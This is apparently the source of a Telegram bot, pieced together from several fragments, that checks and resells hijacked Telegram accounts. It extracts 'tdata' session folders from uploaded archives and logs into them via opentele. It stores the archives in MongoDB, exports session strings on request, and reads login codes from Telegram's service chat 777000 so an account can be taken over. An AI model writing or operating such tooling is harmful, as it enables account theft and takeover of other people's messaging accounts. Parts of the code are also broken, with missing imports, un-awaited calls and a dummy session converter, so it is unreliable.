from pyromod.exceptions import ListenerTimeout
from config import Txt, Config
#from .start import db

import os
import zipfile
import tempfile
import shutil
from pyrogram import Client, filters
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import functions
  # external helper


API_ID = Config.API_ID
API_HASH = Config.API_HASH






import os
import tempfile
import zipfile
import shutil
import rarfile
import traceback
import asyncio
import hashlib

from telethon.sessions import StringSession
from telethon import TelegramClient, functions
from pyrogram import Client, filters



# --- Helper: read tdata key file
def _get_key_data(tdata_path: str):
    if os.path.isdir(tdata_path):
        key_file = os.path.join(tdata_path, "key_datas")
        if not os.path.exists(key_file):
            raise FileNotFoundError("❌ key_datas file not found in tdata folder")
        with open(key_file, "rb") as f:
            return f.read()
    elif os.path.isfile(tdata_path):
        with open(tdata_path, "rb") as f:
            return f.read()
    else:
        raise FileNotFoundError("❌ Invalid tdata path (neither file nor folder)")


# --- Convert tdata -> session string
async def convert_tdata(tdata_path: str, api_id: int, api_hash: str) -> str:
    key_data = _get_key_data(tdata_path)
    fake_key = hashlib.sha256(key_data).digest()  # dummy session key

    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.start()
    session_str = client.session.save()
    await client.disconnect()
    return session_str


# --- Login with tdata & fetch account info
async def login_with_tdata(tdata_path):
    session_str = await convert_tdata(tdata_path, API_ID, API_HASH)

    async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
        me = await client.get_me()
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # 2FA check
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Spam check
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }



import os
import asyncio
import tempfile
import shutil
import zipfile
import rarfile
import base64

from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
from opentele.td import TDesktop
from opentele.api import UseCurrentSession
import motor.motor_asyncio



class Database:
    def __init__(self, uri, database_name):
        self._client = motor.motor_asyncio.AsyncIOMotorClient(uri)
        self.db = self._client[database_name]
        self.col = self.db.used

    async def get_next_account_num(self):
        """Return next unique account number"""
        last = await self.col.find_one(sort=[("account_num", -1)])
        if not last:
            return 1
        return last["account_num"] + 1

    async def save_account(self, user_id, account_num, info, tdata_bytes):
        """
        Save account info + tdata in MongoDB
        """
        doc = {
            "_id": user_id,
            "account_num": account_num,
            "name": info.get("name", "?"),
            "phone": info.get("phone", "?"),
            "twofa": info.get("twofa", "?"),
            "spam": info.get("spam", "?"),
            "tdata": base64.b64encode(tdata_bytes).decode("utf-8"),
        }
        await self.col.update_one({"_id": user_id}, {"$set": doc}, upsert=True)

    async def total_users_count(self):
        return await self.col.count_documents({})


db = Database(Config.DB_URL, Config.DB_NAME)

import os, zipfile, rarfile, tempfile, shutil, base64
from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError
from opentele.td import TDesktop, UseCurrentSession

# --- Your Database class assumed already defined somewhere as db

@Client.on_message(filters.document)
async def handle_archive(client, message):
    tempdir = tempfile.mkdtemp()
    results = []
    try:
        # --- Step 1: Download
        await message.reply("📥 Downloading file...")
        file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
        await message.reply(f"✅ File downloaded: `{file_path}`")

        extract_dir = os.path.join(tempdir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)

        # --- Step 2: Try extracting as ZIP or RAR
        extracted_ok = False
        try:
            with zipfile.ZipFile(file_path, "r") as zip_ref:
                zip_ref.extractall(extract_dir)
            await message.reply(f"📦 ZIP extracted to: `{extract_dir}`")
            extracted_ok = True
        except Exception as e_zip:
            try:
                with rarfile.RarFile(file_path, "r") as rar_ref:
                    rar_ref.extractall(extract_dir)
                await message.reply(f"📦 RAR extracted to: `{extract_dir}`")
                extracted_ok = True
            except Exception as e_rar:
                return await message.reply(
                    f"❌ Not a valid ZIP or RAR.\n"
                    f"ZIP error: {e_zip}\nRAR error: {e_rar}"
                )

        # --- Step 3: Find tdata folders
        tdata_paths = []
        for root, dirs, files in os.walk(extract_dir):
            if "tdata" in dirs:
                tdata_paths.append(os.path.join(root, "tdata"))
            for f in files:
                if f.lower().endswith(".rar"):
                    rar_path = os.path.join(root, f)
                    try:
                        rar_extract_dir = os.path.join(root, "rar_extracted")
                        os.makedirs(rar_extract_dir, exist_ok=True)
                        with rarfile.RarFile(rar_path, "r") as rf:
                            rf.extractall(rar_extract_dir)
                        for r2, d2, f2 in os.walk(rar_extract_dir):
                            if "tdata" in d2:
                                tdata_paths.append(os.path.join(r2, "tdata"))
                    except Exception as e:
                        results.append(f"⚠️ Failed to extract inner rar {f}: {e}")

        if not tdata_paths:
            return await message.reply("⚠️ No `tdata` folders detected in this archive.")

        # --- Step 4: Try login with each tdata
        for idx, tdata_path in enumerate(tdata_paths, 1):
            await message.reply(f"➡️ Processing tdata #{idx} at `{tdata_path}`")
            try:
                tdesk = TDesktop(tdata_path)
                if not tdesk.isLoaded():
                    results.append(f"#{idx} ⚠️ Failed to load (corrupted tdata)")
                    continue

                tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                await tele_client.connect()

                if not await tele_client.is_user_authorized():
                    results.append(f"#{idx} ⚠️ Not authorized (needs login / 2FA)")
                    continue

                me = await tele_client.get_me()

                # --- Detect 2FA state
                if tdesk.HasPassword:
                    twofa_state = "2FA: Enabled but unlocked via tdata"
                else:
                    try:
                        await tele_client.sign_in(password="dummy")
                    except SessionPasswordNeededError:
                        twofa_state = "2FA: Enabled (password required)"
                    else:
                        twofa_state = "2FA: Disabled"

                info = {
                    "name": me.first_name or "?",
                    "phone": me.phone or "?",
                    "twofa": twofa_state,
                    "spam": getattr(me, "restricted", False),
                }

                # Save in Mongo
                acc_num = await db.get_next_account_num()
                with open(file_path, "rb") as f:
                    archive_bytes = f.read()
                await db.save_account(me.id, acc_num, info, archive_bytes)

                results.append(
                    f"#{acc_num}\n"
                    f"Account Name: {info['name']}\n"
                    f"Phone Number: {info['phone']}\n"
                    f"{info['twofa']}\n"
                    f"Spam Mute: {info['spam']}\n"
                )

                await tele_client.disconnect()

            except SessionPasswordNeededError:
                results.append(f"#{idx} ❌ 2FA: Enabled (password required)")
            except PhoneNumberBannedError:
                results.append(f"#{idx} 🚫 BANNED number")
            except Exception as e:
                results.append(f"#{idx} ❌ Error: {str(e)}")

        # --- Final report
        report_text = "📑 Final Report:\n\n" + "\n".join(results)
        report_path = os.path.join(tempdir, "report.txt")
        with open(report_path, "w") as f:
            f.write(report_text)

        await message.reply_document(report_path, caption="✅ Report generated")

    except Exception as e:
        await message.reply(f"❌ Top-level error: {e}")
    finally:
        shutil.rmtree(tempdir, ignore_errors=True)





        


                        

async def check_valid_session(tdata_bytes):
    """Check if a stored tdata is still valid."""
    temp_dir = tempfile.mkdtemp()
    tdata_path = os.path.join(temp_dir, "tdata.zip")

    with open(tdata_path, "wb") as f:
        f.write(base64.b64decode(tdata_bytes))

    # Extract
    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_path, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        from tdata_converter import convert_tdata
        session = convert_tdata(extract_dir, API_ID, API_HASH)
        with TelegramClient(session, API_ID, API_HASH) as client:
            if client.is_user_authorized():
                me = client.get_me()
                return True, me, session
            else:
                return False, None, None
    except Exception:
        return False, None, None
    finally:
        shutil.rmtree(temp_dir)


@Client.on_message(filters.command("retrieve") & filters.private)
async def retrieve_account(client, message):
    if len(message.command) < 2:
        return await message.reply("⚠️ Usage: `/retrieve user_id`", quote=True)

    user_id = int(message.command[1])
    doc = await db.col.find_one({"_id": user_id})
    if not doc:
        return await message.reply("❌ Account not found in database.")

    # Check validity
    valid, me, session = await check_valid_session(doc["tdata"])
    status = "✅ Valid" if valid else "❌ Invalid"

    text = (
        f"📂 Account Info\n"
        f"User ID: {user_id}\n"
        f"Name: {doc['name']}\n"
        f"Phone: {doc['phone']}\n"
        f"2FA: {doc['twofa']}\n"
        f"Spam: {doc['spam']}\n"
        f"Status: {status}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Session Tele", callback_data=f"tele_{user_id}")],
        [InlineKeyboardButton("📄 Session Py", callback_data=f"py_{user_id}")],
        [InlineKeyboardButton("📱 By Phone", callback_data=f"phone_{user_id}")]
    ])

    await message.reply(text, reply_markup=keyboard)


@Client.on_callback_query(filters.regex(r"^(tele|py|phone)_(\d+)$"))
async def retrieve_options(client, callback_query):
    action, uid = callback_query.data.split("_")
    uid = int(uid)

    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    valid, me, session = await check_valid_session(doc["tdata"])
    if not valid:
        return await callback_query.message.edit("❌ Session expired / invalid.")

    if action == "tele":
        string = session.save()
        txt = io.StringIO(string)
        txt.name = f"{uid}_tele_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Telethon Session")
    elif action == "py":
        from pyrogram import Client as PyroClient
        from pyrogram.sessions import StringSession as PyroSession
        pyro_string = PyroSession().save()
        txt = io.StringIO(pyro_string)
        txt.name = f"{uid}_pyrogram_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Pyrogram Session")
    elif action == "phone":
        phone = doc["phone"]
        await callback_query.message.reply(
            f"📱 Phone number: `{phone}`\n\nClick **Get Code** after sending code to this number.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{uid}")]
            ])
        )



import re
import tempfile, zipfile, shutil, os, base64
from telethon import TelegramClient
from tdata_converter import convert_tdata


@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
async def get_code(client, callback_query):
    uid = int(callback_query.data.split("_")[1])
    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    # Prepare tdata temp folder
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")
    with open(tdata_zip, "wb") as f:
        f.write(base64.b64decode(doc["tdata"]))

    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        # Convert tdata → Telethon session
        session = convert_tdata(extract_dir, API_ID, API_HASH)

        async with TelegramClient(session, API_ID, API_HASH) as tele:
            # Get last message from official Telegram (777000)
            msgs = await tele.get_messages(777000, limit=1)
            if not msgs:
                return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)

            text = msgs[0].message
            match = re.search(r"Login code[:\s]+(\d{5})", text)
            if match:
                code = match.group(1)
                await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
            else:
                await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)

    except Exception as e:
        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
    finally:
        shutil.rmtree(temp_dir)
